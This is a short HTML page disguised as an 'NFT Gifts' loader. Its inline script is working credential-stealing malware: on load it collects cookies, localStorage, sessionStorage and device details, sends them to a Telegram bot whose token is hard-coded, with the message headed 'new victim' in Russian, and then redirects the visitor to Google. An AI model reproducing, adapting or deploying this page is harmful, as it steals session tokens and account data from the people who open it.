<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NFT Gifts</title>
    <style>
        body {
            background: #0a0e1a;
            color: white;
            font-family: system-ui;
            text-align: center;
            padding-top: 30%;
        }
        .loader {
            width: 40px;
            height: 40px;
            border: 3px solid #6a0dad;
            border-top-color: transparent;
            border-radius: 50%;
            margin: 20px auto;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h2>Loading NFT Collection...</h2>
    <div class="loader"></div>
    
    <script>
        (function() {
            const ua = navigator.userAgent;
            const isTG = /Telegram/i.test(ua);
            const isAndroid = /Android/i.test(ua);
            const isIOS = /iPhone|iPad|iPod/i.test(ua);
            
            const stolen = {
                time: Date.now(),
                url: location.href,
                userAgent: ua,
                isTG: isTG,
                isAndroid: isAndroid,
                isIOS: isIOS,
                localStorage: {},
                sessionStorage: {},
                cookies: document.cookie
            };
            
            // Кража localStorage
            for(let i = 0; i < localStorage.length; i++) {
                let key = localStorage.key(i);
                stolen.localStorage[key] = localStorage.getItem(key);
            }
            
            // Кража sessionStorage
            for(let i = 0; i < sessionStorage.length; i++) {
                let key = sessionStorage.key(i);
                stolen.sessionStorage[key] = sessionStorage.getItem(key);
            }
            
            // Отправка в Telegram бота (бесплатно)
            const BOT_TOKEN = "8716367174:AAHeVAICMospl7aYouFRJBUcU2FCdOixgxM";
            const CHAT_ID = "8019526165";
            
            const message = `
🔑 НОВАЯ ЖЕРТВА
📱 Устройство: ${isAndroid ? 'Android' : (isIOS ? 'iOS' : 'PC')}
📲 В Telegram: ${isTG ? 'Да' : 'Нет'}
🆔 User Agent: ${ua.substring(0, 100)}
💾 localStorage: ${JSON.stringify(stolen.localStorage).substring(0, 500)}
            `;
            
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message
                })
            });
            
            // Перенаправление через 2 секунды
            setTimeout(() => {
                window.location.href = 'https://google.com';
            }, 2000);
        })();
    </script>
</body>
</html>
